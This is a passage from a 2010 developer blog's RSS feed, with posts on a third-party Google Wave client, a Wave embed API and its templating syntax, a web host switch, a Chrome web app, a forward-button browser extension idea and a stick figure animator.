&lt;a href=&quot;/articles/2010/μwave/microwave-screen630.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/μwave/microwave-screen630.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;microwave-screen630&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;a href=&quot;/articles/2010/μwave/microwave-screen630-wave.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/μwave/microwave-screen630-wave.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;microwave-screen630-wave&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;

μwave is the first true third-party wave client which is compatible with Google Wave. It’s free to use at &lt;a href=&quot;http://micro-wave.appspot.com/&quot;&gt;http://micro-wave.appspot.com/&lt;/a&gt; and works great on mobile devices. It supports searching for waves, opening them and writing replies.

The source code for the server component is open-source and can be &lt;a href=&quot;http://gist.github.com/417035&quot;&gt;found on github&lt;/a&gt; (though it’s slightly outdated, but the important stuff is there). It’s fairly simple (It’s based on the original &lt;a href=&quot;http://oauth.googlecode.com/svn/code/python/oauth/example/client.py&quot;&gt;example code&lt;/a&gt; so I’m going to have the same MIT license), but one of the few python scripts which can do authentication with google and pass commands to the data api.  It relies on the&lt;a href=&quot;http://oauth.googlecode.com/svn/code/python/oauth/&quot;&gt;Python OAuth Library&lt;/a&gt;.

A list of posts related to this can be &lt;a href=&quot;http://antimatter15.com/2010/06/mwave/category/wave-2/microwave-wave-2/&quot;&gt;found here&lt;/a&gt;.
&lt;/div&gt;


</description>
    </item>
    <item>
      <title>Wave Reader</title>
      <link>http://antimatter15.com/2010/06/wave-reader/</link>
      <pubDate>Wed, 30 Jun 2010 03:20:09 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/06/wave-reader/</guid>
      <author></author>
      <description>&lt;div&gt;

&lt;a href=&quot;/articles/2010/Wave%20Reader/Information-2-Chromium_080.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Wave%20Reader/Information-2-Chromium_080.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Information 2 - Chromium_080&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;

Wave Reader started around early December of 2009 to fill a somewhat significant void. Embedded waves could not be accessed by people who were not logged into their Google accounts, there was no way to link to a specific blip and the official wave client was insanely slow. Most of these issues have been mitigated, so the project is virtually defunct.
&lt;/div&gt; 


</description>
    </item>
    <item>
      <title>μwave updates again</title>
      <link>http://antimatter15.com/2010/06/mwave-updates-again/</link>
      <pubDate>Wed, 30 Jun 2010 03:07:46 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/06/mwave-updates-again/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/μwave%20updates%20again/microwave-screen630.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/μwave%20updates%20again/microwave-screen630.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;microwave-screen630&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;a href=&quot;/articles/2010/μwave%20updates%20again/microwave-screen630-wave.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/μwave%20updates%20again/microwave-screen630-wave.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;microwave-screen630-wave&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Edit mode&lt;/strong&gt; is no longer experimental, a new implementation includes a tiny diff engine which allows editing a post without necessarily destroying layout. Root blip editing is now possible. There is a new&lt;strong&gt; tag list&lt;/strong&gt; on the bottom of each wave, also including an “Add Tag” button. &lt;strong&gt;Search results&lt;/strong&gt; are now formatted with modification date, number of blips, number of unread blips and read/unread state. There is a new &lt;strong&gt;settings panel&lt;/strong&gt; when you click the logo. Added support for the internet exploder browser starting at version six. Owner_utils is a setting which adds utilities like “set everyone as read only”. The New Wave feature no longer creates pop-up prompts, but rather silently creates and opens an empty wave. It renders the live-editing cursors. There is a &lt;strong&gt;new multipane interface&lt;/strong&gt; for desktop. Gadget support has greatly improved. It handles rotation on a mobile webkit device better. It now uses Wave Data/Robots Protocol 0.22 and &lt;strong&gt;renders using the newly exposed conversation model&lt;/strong&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Done switching webhosts</title>
      <link>http://antimatter15.com/2010/06/done-switching-webhosts/</link>
      <pubDate>Wed, 30 Jun 2010 02:04:17 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/06/done-switching-webhosts/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Done%20switching%20webhosts/HostMonster_thumb.jpg.gif&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Done%20switching%20webhosts/HostMonster_thumb.jpg.gif&quot; &gt;&lt;div class=&quot;caption&quot;&gt;HostMonster_thumb.jpg&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So I guess it’s done, the DNS may still be propagating, but it should be not too bumpy. &lt;/p&gt;
</description>
    </item>
    <item>
      <title>Deep Integration Wave Embed API</title>
      <link>http://antimatter15.com/2010/06/deep-integration-wave-embed-api/</link>
      <pubDate>Tue, 29 Jun 2010 22:29:05 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/06/deep-integration-wave-embed-api/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Deep%20Integration%20Wave%20Embed%20API/Selection_076.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Deep%20Integration%20Wave%20Embed%20API/Selection_076.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Can you tell that Wave is the backend? I think not.&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;a href=&quot;/articles/2010/Deep%20Integration%20Wave%20Embed%20API/Selection_078.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Deep%20Integration%20Wave%20Embed%20API/Selection_078.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Just to prove that it&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Can you tell that the screenshot on the left is actually an embedded wave? Probably not.&lt;/p&gt;
&lt;p&gt;First, a little overview on what this is. A lot of people are interested in using Google Wave as a commenting system, however the &lt;strong&gt;official embed api at the current state suffers from several shortfalls&lt;/strong&gt;. It’s tedious to operate a wave-integrated commenting system. As an author, you have to &lt;strong&gt;manually create a wave for every post&lt;/strong&gt;, copy the content over to the wave, get the wave ID, and paste it into your template. Every time you change your post, you have to yet again manually sync the page with wave. Once you’ve gotten the wave into the page, the embedded wave itself has a few issues. You &lt;strong&gt;can’t style it using CSS&lt;/strong&gt;, and you can only change the background color and font. The width can’t adjust to the width of your page after the initial load. There’s no way to get rid of or change the style of the&lt;strong&gt; huge blue border&lt;/strong&gt; around it. It&lt;strong&gt; forces it’s own scroll bar&lt;/strong&gt; which looks nothing like anything else on the page and &lt;strong&gt;prevents intuitive navigation&lt;/strong&gt; of comments using the same scrollbar as the rest of the page. Lastly, there’s no way for anonymous readers to comment on the post.&lt;/p&gt;
&lt;p&gt;For each of these issues,&lt;strong&gt; the new w2_embed api offers a solution&lt;/strong&gt;. Instead of using iframes to hack another page onto the current one, this one is built into the page, injecting elements directly onto the page’s DOM. These&lt;strong&gt; elements can be styled in nearly any imaginable way through CSS and HTML&lt;/strong&gt;. The sandboxed and namespaced single-function API allows for multiple waves on one page with less than 10KB of JS overhead (Compare to about 1.4 megabytes). Instead of relying on a special Wave ID, the app uses a centralized and remotely stored database which associates any identifier you provide with functional wave IDs. That means, that instead of using a string like &lt;code&gt;googlewave.com!w+Blsm0RMW_A&lt;/code&gt;, you have the URL of your blog, say &lt;code&gt;2010/06/wave-embed-api&lt;/code&gt;. Not only that, but it can &lt;strong&gt;automatically pull the title of your wave, the authors, the permalink and tags from the post, automatically create a wave from that with the same tags and title with the content automatically set as the root blip as well as a permalink back to the blog post&lt;/strong&gt;. When viewed from wave, the user can follow, unfollow, search and find waves using the exact same familiar interface. On your blog, you can make the wave backend entirely seamless and subtle. Since it’s built on top of Anonybot&lt;strong&gt;, people can reply blips without having google wave&lt;/strong&gt; accounts right from your blog.&lt;/p&gt;
&lt;p&gt;It’s all part of a new embed API built upon Anony-bot (which itself is built upon microwave, which is built on wave reader, which is built upon the prototype python desktop client… Someone should make a wordpress plugin for this to make this family history even longer).&lt;/p&gt;
&lt;p&gt;The&lt;a href=&quot;http://antimatter15.com/2010/06/deep-integration-wave-embed-api/2010/06/anony-bot-embed-api/&quot;&gt; last post noted the beginning of this project,&lt;/a&gt; and here is part two. The API has been cleaned up a lot. The code has been simplified. Features added and design changed.&lt;/p&gt;
&lt;p&gt;The major change is a total decoupling of it and the mainline Anonybot codebase. There are some major implications of the change. In the original prototype of the API, it still had the iconic blip context menu inherited from microwave. That’s gone. So is the participants bar, link to real wave client, blip html, blip content, reply box, and everything. There are now no required or automatically added html/dom elements. Everything is specified through a &lt;strong&gt;simple HTML templating engine&lt;/strong&gt;. Since the code isn’t shared, changes from each individual project now on probably won’t be instantly applied to both. This has advantages and disadvantages. On the plus side, is that changes to anonybot won’t break the embed api. However, bug fixes on one may not propagate to the other.  The code can be much smaller since features like search, which was previously hidden, can now be totally removed. Also, since it’s been rewritten from scratch as an embed api, it no longer exposes any extra globals and multiple embeds can be done for each page.&lt;/p&gt;
&lt;p&gt;The biggest change is the templating engine. Before, it only worked with the blip design, but now it’s totally integral to every aspect of the interface. Lets walk through the basics of the API, starting with a minimal example.&lt;/p&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;http://gist.github.com/458802.js?file=w2_embed_demo.html&quot;&gt;&lt;/script&gt;All the content is wrapped in a huge hidden `div`, and inside is one element with the `wavebody` class. That huge wave is the scope of the templating engine. That means that if you put `{{1+1}}` anywhere inside the `div`, it'll show up as 2\. Place it anywhere outside the div, and it shows up as `{{1+1}}`. Simple, right? The `wavebody` element is where the actual blips will go. But since there aren't any blips beforehand, `wavebody` is filled with the template for a single blip. The content gets multiplied several times and that makes the wave. The template scheme is really simple. Basically, you just wrap arbitrary JS code within `{{` and `}}`. The code gets executed (in the scope of the wave) and the block gets replaced with the return value of the script. When you're inside `wavebody` there are a few additional blip-specific things that you can add. Now we have to learn the magical snippets of code you can use inside the curly brackets. One of the objects exposed to the templates is `wave`. The nice thing is that it mirrors [the wave api](http://code.google.com/apis/wave/extensions/robots/protocol.html#Wavelets). So the wave object exposes the following attributes (copied from the google page).

*   `creationTime` denotes the [Unix time](http://en.wikipedia.org/wiki/Unix_time) at which this wavelet was created.
*   `creator` denotes the address of the participant who created this wavelet.
*   `lastModifiedTime` denotes the [Unix time](http://en.wikipedia.org/wiki/Unix_time) at which the wavelet was last modified by any participant.
*   `participants` contains an array of participant IDs for all participants on the wave.
*   `rootBlipId` contains the Blip ID of the root blip.
*   `title` contains the title of the wavelet, which by default consists of the first line of text up to the first carriage return.
*   `version` contains the version of this wavelet. Each atomic operation on a wavelet increases this version number.
*   `waveId` contains the Wave ID of this wavelet.
*   `waveletId` contains the wavelet ID of this wavelet. Note that for waves which contain only one wavelet (that don't have private conversations, in other words), this wavelet ID is usually of the form `conv+root` indicating that the wavelet is identical to the conversation root, the root wave.
*   `dataDocuments` contains a dictionary (associated array) of the IDs and data of any data documents attached to this wavelet.

In addition, there are a few non-standard components.

*   `permalink` contains a link to the waveref which points to the specific wave on the real wave client
*   `blips` contains a js object (similar to a hash or dictionary) of blipIDs associated to blip objects
*   `bliparr` contains an array of blip ids in no particular order, most frequently used for getting the number of replies in a conversation in `{{wave.bliparr.length-1}}`

There are also some functions you can call. For example, `wave.creationTime` is in the form of a unix timestamp. That probably isn't too useful to an ordinary user, so a `format_time` function is there to format it like &quot;6/30 10:45am&quot;. If you want to have some other custom datetime format, get me a script to do it in javascript in less than 500 bytes and I'll include it in the next version.

*   `format_time(int)` Format a unix-style date as a human-readable &quot;6/30 10:45am&quot; or if you prefer &quot;m/d h:MMtt&quot;
*   `render(blip)` Render a blip and return the HTML. Most of the time, it's unnecessary as there's a blip.html attribute

There are a few actions that you can do. Certain strings like `{{addparticipant}}` can be used in `onclick=` attributes to trigger certain actions on various events.
&lt;script type=&quot;text/javascript&quot; src=&quot;http://gist.github.com/458944.js?file=events.w2_embed.html&quot;&gt;&lt;/script&gt;

&lt;p&gt;Here you see a link and a button. The link has been configured to prompt the user for a participant ID to add when clicked, and the button was set to prompt the user for a tag to add when clicked. There are several such actions.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;addparticipant&lt;/code&gt; Prompt the suer for a wave address to add to the wave&lt;/li&gt;
&lt;li&gt;&lt;code&gt;reload&lt;/code&gt; Reload the current wave&lt;/li&gt;
&lt;li&gt;&lt;code&gt;addtag&lt;/code&gt; Prompt the user for a tag to add&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;setname&lt;/code&gt; Prompt the user to set a username for posting
There is also the user list. It comes in two flavors, &lt;code&gt;{{participantlist}}&lt;/code&gt; and &lt;code&gt;{{contributorlist}}&lt;/code&gt;. The latter only works when inside a blip scope (the stuff inside &lt;code&gt;wavebody&lt;/code&gt;). They’re special because they’re actually interactive. When the list is long, it shortens it and creates a link to expand.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;participantlist&lt;/code&gt; A list made from wave.participants&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;contributorlist&lt;/code&gt; Only works when in &lt;code&gt;wavebody&lt;/code&gt;, a simple users list made from blip.contributors
Now, is finally the stuff that goes in the blip. Like &lt;code&gt;wave&lt;/code&gt; it extends some wave api features, so I’ll start with&lt;a href=&quot;http://code.google.com/apis/wave/extensions/robots/protocol.html#Blips&quot;&gt; pasting what google has documented&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;blipId&lt;/code&gt; contains the ID of blip in which the event occurred.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;childBlipIds&lt;/code&gt; contains an array of blip IDs for each of the blip’s children.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;contributors&lt;/code&gt; denotes participants who have contributed to the state of this blip.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;creator&lt;/code&gt; denotes the participant who created this blip.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;lastModifiedTime&lt;/code&gt; denotes the &lt;a href=&quot;http://en.wikipedia.org/wiki/Unix_time&quot;&gt;Unix time&lt;/a&gt; at which this blip was last modified by any participant.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;content&lt;/code&gt; contains the textual content of this blip.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;version&lt;/code&gt; contains the version of this blip. Each atomic operation on a blip increases this version number.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;waveId&lt;/code&gt; contains the Wave ID associated with this blip.&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;waveletId&lt;/code&gt; contains the wavelet ID associated with this blip. Note that for waves which contain only one wavelet (that don’t have private conversations, in other words), this wavelet ID is usually of the form &lt;code&gt;conv+root&lt;/code&gt; indicating that the wavelet is identical to the conversation root, the root wave.
There are a few additional methods which, again are non-standard.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;permalink&lt;/code&gt; contains a link to the waveref which points to the specific blip on the real wave client&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;html&lt;/code&gt; contains a string of the rendered (with formatting and annotations applied) content
There are also actions, similar to the global &lt;code&gt;addparticipant&lt;/code&gt;, &lt;code&gt;reload&lt;/code&gt; and &lt;code&gt;setname&lt;/code&gt; actions. They can still be used within &lt;code&gt;wavebody&lt;/code&gt; but there are some actions which can &lt;em&gt;only&lt;/em&gt; work in the blip template.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;edit&lt;/code&gt; Add an edit box immediately below the blip, pre-populated with the text content of the blip&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;remove&lt;/code&gt; Remove the blip, it will first issue a confirmation prompt to the user&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;reply&lt;/code&gt; Add a reply box immediately below the blip. If there is already a blip below, the reply box is indented.
Below is a little example showing how to use the &lt;code&gt;blip&lt;/code&gt; object.
&lt;script type=&quot;text/javascript&quot; src=&quot;http://gist.github.com/458980.js?file=wavebody.html&quot;&gt;&lt;/script&gt;Lastly is the JS part. Without it, nothing would ever show up. You need to include the currently 6.5KB JS library from &lt;code&gt;http://anony-bot.appspot.com/assets/embed2.mini.js&lt;/code&gt;. After that, you need a separate script tag anywhere after the big hidden super element. It &lt;em&gt;must&lt;/em&gt; be outside the super element (unimaginable evils will happen if it isn’t). Inside that script tag needs to be a function call to &lt;code&gt;w2_embed&lt;/code&gt;. The first (and only) argument has to be a JS object with at least the &lt;code&gt;element&lt;/code&gt; key pointing to a DOM element which contains an element with the class &lt;code&gt;wavebody&lt;/code&gt;. There are &lt;em&gt;lots&lt;/em&gt; of other config options, and here they are.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;element&lt;/code&gt; (Required) a dom element which contains a div with the “wavebody” class&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;identifier&lt;/code&gt; The identifier for the wave that the server will use to generate a wave ID from, default: location.pathname&lt;/li&gt;
&lt;li&gt;&lt;code&gt;root_title&lt;/code&gt; If the identifier has not previously been associated with a wave ID, the wave will be created with the specified title. default: (no title)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;root_content&lt;/code&gt; If the identifier has not previously been associated with a wave ID, the wave will be created with the specified content as the root blip. default: (no content)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;participants&lt;/code&gt; The participants the wave should be created with if not previously associated with a wave ID, default: [], suggested: [‘public@a.gwave.com’]&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hideroot&lt;/code&gt; Boolean whether or not to not render the root blip&lt;/li&gt;
&lt;li&gt;&lt;code&gt;edit&lt;/code&gt; A reference to a DOM element which can be templated into the edit box, should contain handlers for the actions {{submit}} and {{cancel}} as well as a textarea with the class “wavetext”&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tags&lt;/code&gt; Set of tags to be added to the wave if the identifier has not previously been associated with a wave and must be created.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;api_root&lt;/code&gt; The domain containing the server component (proxy and dictionary server). Default: anony-bot.appspot.com&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gadgets&lt;/code&gt; Enable native gadgets (does not work)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;render_state&lt;/code&gt; Display the user a gadget state&lt;/li&gt;
&lt;li&gt;&lt;code&gt;chronological&lt;/code&gt; Render blips chronologically (see Microwave’s “Classic Forum Layout” option)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;json_url&lt;/code&gt; Location of JSON implementation to be loaded dynamically in case it’s not native to the browser default: &lt;a href=&quot;http://anony-bot.appspot.com/assets/json2.mini.js&quot;&gt;http://anony-bot.appspot.com/assets/json2.mini.js&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;waveid&lt;/code&gt; Skip the identifier lookup and directly reference a wave by it’s id
&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can see that the function call was saved to a variable named &lt;code&gt;demo&lt;/code&gt;. That’s useful because you can use that to reference later to manipulate things. The return of a w2_embed call is a JS object with the following keys.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;config&lt;/code&gt; A reference to the initial config object&lt;/li&gt;
&lt;li&gt;&lt;code&gt;reply(text)&lt;/code&gt; Create a root-level reply&lt;/li&gt;
&lt;li&gt;&lt;code&gt;reload()&lt;/code&gt; Reload the wave.
So lets try putting everything together.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Afterthoughts: Just a little thing to add at the end. You can can create a a div with the class &lt;code&gt;waveedit&lt;/code&gt; as used above. It’s not strictly necessary, but it lets you customize things a bit more. You also need a CSS style for .wavethread with a padding-left (or margin-left) in order for threads to show up properly. Blips are automatically given a .waveblip class.&lt;/p&gt;
&lt;p&gt;That screenshot on the top of the post, &lt;a href=&quot;http://anony-bot.appspot.com/assets/test2.html&quot;&gt;if you want to try it out. It’s here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I’m not making any money off of this, so there’s no reason for me to hide the fallibilities of this solution from anyone. This, like any other solution is not perfect. There is no true wave-style real-time editing, it uses polling. It does however update every 10 seconds if it’s configured to do so using the &lt;code&gt;poll_updates: true&lt;/code&gt; configuration option. It can’t ever really do much better, since app engine doesn’t yet support pushing out real time data to attached clients, even though they announced the neat Channel API (still waiting to use it!) at I/O. Either way, that probably won’t help too much as w2_embed uses JSONP for client/server communication across multiple domains, and it’s unlikely that the channel api will allow for that. Also, since there’s no way to fetch a single blip, the user must request the entire wave to check the tiny 32 bit version integer if it’s been incremented, and if it has, then the whole wave has to be fetched again. It’s by no means efficient, and so my server would be very very sad if the polling interval was significantly increased. It’s not very SEO friendly. Though it’s not always that people want the comments to be indexed by search engines, so some people may care less. Accessibility-wise, it shouldn’t be too horrible if the screen reader/browser supports javascript and hugely depends on the HTML being used in conjunction with the script.&lt;/p&gt;
&lt;p&gt;As of date, this was my longest blog post ever, and I would be sad if nobody commented (ironically using my non-wave-based commenting system). And I’m not posting my source code unless someone comments, so, an incentive :P&lt;/p&gt;
</description>
    </item>
    <item>
      <title>It's host switching time.</title>
      <link>http://antimatter15.com/2010/06/it-s-host-switching-time/</link>
      <pubDate>Tue, 29 Jun 2010 06:57:40 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/06/it-s-host-switching-time/</guid>
      <author></author>
      <description>&lt;p&gt;Every year at about this time, I switch hosts, now I’m switching to Host Monster. This site may probably be down for the next day or so.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator on Chrome Web Store (well, when it's released)</title>
      <link>http://antimatter15.com/2010/06/ajax-animator-on-chrome-web-store-well-when-it-s-released/</link>
      <pubDate>Fri, 25 Jun 2010 07:14:29 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/06/ajax-animator-on-chrome-web-store-well-when-it-s-released/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Ajax%20Animator%20on%20Chrome%20Web%20Store%20(well,%20when%20it%27s%20released)/Selection_065.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Ajax%20Animator%20on%20Chrome%20Web%20Store%20(well,%20when%20it%27s%20released)/Selection_065.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Webstore&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/ajaxanimator/webstore.crx&quot;&gt;http://antimatter15.com/ajaxanimator/webstore.crx&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If you run &lt;tt&gt;chrome —enable-apps&lt;/tt&gt; and install it, you &lt;em&gt;might&lt;/em&gt; be able to see an icon and magically be able to use the app offline. Or wait until the webstore is finally released and then you can just install it.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Edit July 10, 2010:&lt;/strong&gt; Actually it was a while ago, but now the app works again and automatically restores the last state using localstorage.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>The Forward Button</title>
      <link>http://antimatter15.com/2010/06/the-forward-button/</link>
      <pubDate>Fri, 25 Jun 2010 06:48:57 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/06/the-forward-button/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/The%20Forward%20Button/Selection_006.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/The%20Forward%20Button/Selection_006.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Selection_006&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;dl id=&quot;attachment_1404&quot; class=&quot;wp-caption alignnone&quot; style=&quot;width: 213px;&quot;&gt;&lt;dd class=&quot;wp-caption-dd&quot;&gt;Taken from the chromium site, which is really cool itself.&lt;/dd&gt;&lt;/dl&gt;I would dare say that one of the least useful buttons on my browser has to be the Forward button. It’s the analogue for the far more used back button, but most of the time, people progress forward, not &lt;a href=&quot;http://www.jonathancoulton.com/wiki/index.php/De-Evolving&quot;&gt;backward&lt;/a&gt; (obviously a pretty good thing). There’s still a huge bit of potential for this underused button. I have&lt;a href=&quot;http://www.trust.com/products/product.aspx?artnr=15080&quot;&gt; a mouse&lt;/a&gt; with buttons on the left side for navigating forward and back, It’s really quite nice (though the triple-click button makes me develop a tendency to click randomly when reading, which makes those sites with the double-click lookup very annoying).&lt;/p&gt;
&lt;p&gt;One of the most horrible developments in usability has been Pagination, because someone thought it would be a great idea to split everything into annoying separate pages. Sure it was a way to get around a technical issue of browser reflow while progressively rendering and bandwidth usage. But it set a nasty precedent for the future of web-interaction.&lt;/p&gt;
&lt;p&gt;Now we have to live with it.&lt;/p&gt;
&lt;p&gt;So I was thinking, is there any way to use my side buttons in Javascript? I quickly &lt;a href=&quot;http://jsbin.com&quot;&gt;prototyped&lt;/a&gt; a demo but to my dismay, clicks only triggered with a .button of 0, 1 or 2. Then I realized that I could programatically alter history and detect hash changes. So then came another prototype which worked by setting the URL to “#Math.random()” and then doing a history.go(-1), hooking onto window.onhashchange to see when something changed. Then I discovered the new HTML5 history.pushState() and onpopstate events and switched accordingly.&lt;/p&gt;
&lt;p&gt;Now, that it’s possible to trick the browser into populating the&lt;a href=&quot;http://ajaxian.com/archives/the-future-of-history&quot;&gt; future of history&lt;/a&gt;. How do you decide what the user is probably going to next? The great thing is that if we guess wrong, it doesn’t really matter, anything is still better than a non-functional forward button.&lt;/p&gt;
&lt;p&gt;So how do you predict where the user wants to go next? In most paginated systems, on the top and/or bottom of a post is a series of links [1] [2] [3] [4]. The current page is usually grayed out and unclickable. This makes it pretty easy to detect, just iterate each link by node order, parseInt the innerText and see if there’s a single-number jump in the middle, offset it by one and then you get the next page in order.&lt;/p&gt;
&lt;p&gt;I actually wrote this such a long time ago that I basically forgot where the extension is and after using it, I’ve disabled it myself because chrome seems to have a few nasty bugs that cause it to crash (tabs at least) quite frequently when it’s enabled. &lt;a href=&quot;https://gist.github.com/a828411054fe1de22be9&quot;&gt;But here it is.&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>stick figure animator</title>
      <link>http://antimatter15.com/2010/06/stick-figure-animator/</link>
      <pubDate>Tue, 22 Jun 2010 05:29:03 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/06/stick-figure-animator/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/wp/wp-content/uploads/2010/06/Stick2-αq-Chromium_063.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;http://antimatter15.com/wp/wp-content/uploads/2010/06/Stick2-αq-Chromium_063.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;codenamed stick2&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;One thing the ajax animator’s pretty bad at is stick figures. Sure it’s not impossible, but it can’t really compare with the ol-fashioned frame-by-frame joint-manipulation likeness of &lt;a href=&quot;http://www.google.com/images?client=ubuntu&amp;amp;channel=cs&amp;amp;q=pivot&amp;amp;qscrl=1&amp;amp;um=1&amp;amp;ie=UTF-8&amp;amp;source=univ&amp;amp;ei=GF0hTJejE4H98AaJ0qxg&amp;amp;sa=X&amp;amp;oi=image_result_group&amp;amp;ct=title&amp;amp;resnum=4&amp;amp;ved=0CDQQsAQwAw&quot;&gt;Pivot&lt;/a&gt;. It’s called stick2 because the &lt;a href=&quot;http://antimatter15.com/2010/06/stick-figure-animator/2010/02/stick-figures/&quot;&gt;original experiment &lt;/a&gt;with stickfigures was named stick.html, and when I went to extend it and didn’t feel like setting up a git/svn repo, I copied the file and named it stick2.html, and with no good project-naming skills, it stayed that way.&lt;/p&gt;
&lt;p&gt;Anyway, this was a project that got pretty close to completion in early march, but I never bothered to blog about it until now. It should work pretty not-bad on an iPad J(except the color picker), though honestly, I’ve never tried it.&lt;/p&gt;
&lt;p&gt;The interface is pure jQuery/html/css. The graphics are done with Raphael, but the player actually uses &amp;lt;canvas&amp;gt; for no particular reason.&lt;/p&gt;
